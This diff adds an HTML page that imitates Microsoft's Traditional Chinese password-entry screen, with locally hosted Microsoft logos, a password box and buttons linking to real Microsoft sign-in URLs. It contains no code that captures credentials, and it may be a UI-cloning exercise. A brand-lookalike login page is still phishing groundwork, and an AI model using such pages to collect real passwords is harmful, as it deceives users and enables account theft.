@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <title>登入您的 Microsoft 帳戶</title>
+    <link rel="icon" href="images/Microsoft.ico">
+    <link rel="stylesheet" href="stylesheets/pwstyle.css">
+    <script src="javascripts/script.js"></script>
+</head>
+<body>
+<div class="light-box">
+    <div class="Logo">
+        <img src="images/microsoft_logo.svg">
+    </div>
+    <div class="Login-Font">
+        輸入您的密碼
+    </div>
+    <div>
+        <button id="backbutton">
+            <a href="index.html">
+                <img src="images/arrow.svg">
+            </a>
+        </button>
+        <span class="email_add">
+            <!-- 這裡的email address是從index.html的input中取得的 -->
+
+            </span>
+    </div>
+    <div class="input-container">
+        <input type="email" placeholder="密碼">
+    </div>
+    <span class="forget-password">
+        <a href="https://account.live.com/acsr?uaid=d02d3ccc079b44dcb443a87dd36780db">忘記密碼嗎?</a>
+    </span>
+    <div>
+        <button class="Login">
+            <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3a%3aaccount.microsoft.com%3a%3aMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin-oauth&client-request-id=a055bc02-0246-4823-a2b0-db4616375c0f&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBOZaCMAAA0LvYWrDGQDGFQAAlhlUWOwxrGLY3IMLp5__T5REFXVE4Bd8toDcvk2V40QiDu79fjTBZwkY093YlOYPGpKQM9Joid6isOPYydLEth2uloUZoOMJHBI8rPoi5FMcxFf7yi5d3EjGpjdeRW3Mog61YI9P5HvTIzZW6KQXW15R6atUlT2NjbGtYumNhQ5B0-ZIQnAHIPD8fahJz7vOzCtJA_ZhNXapvn4zIFg-hgQ7h8Ph5tTXZUZ9y93BkNo-J1Bt7E_8NlpIS9zxVjwVLKEZ6ErXbTeWD83Onm6UFHwT50GGjn3mZymZ6fu8Vzp3RFme4N7blWS8-05lq5hLVgnAGuXp1P5GLuRtuicB9PaNuEbjrHkEtlhRx-_k5_QOIrT19WgEAAA&msaoauth2=true&lc=1028&sso_nonce=AwABEgEAAAACAOz_BQD0_4nVjmyJwqnBXTcLMTyU-p7xob_MZffpFYpllmyKBeLN-zB0WlMnIDbOc5as6wHl3gJxv6HQ-1sff9DskPK7DWQgAA&mscrid=a055bc02-0246-4823-a2b0-db4616375c0f">
+                <span>登入</span>
+            </a>
+        </button>
+    </div>
+</div>
+<div class="login-option" onclick="to_loginoption()">
+    <a href="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=151&ct=1715082810&rver=7.3.6960.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2frpsauth%2fv1%2faccount%2fSignInCallback%3fstate%3deyJSdSI6Imh0dHBzOi8vd3d3Lm1pY3Jvc29mdC5jb20vemgtdHciLCJMYyI6IjEwMjgiLCJIb3N0Ijoid3d3Lm1pY3Jvc29mdC5jb20ifQ&lc=1028&id=74335&aadredir=0"></a>
+    <img src="images/signin_options.svg">
+    <span>登入選項</span>
+</div>
+<div class="bottom-text">
+    <span onclick="to_service()">使用條例</span>
+    <span onclick="to_privacy()">隱私權與 Cookie</span>
+    <span>...</span>
+</div>
+</body>
+</html>
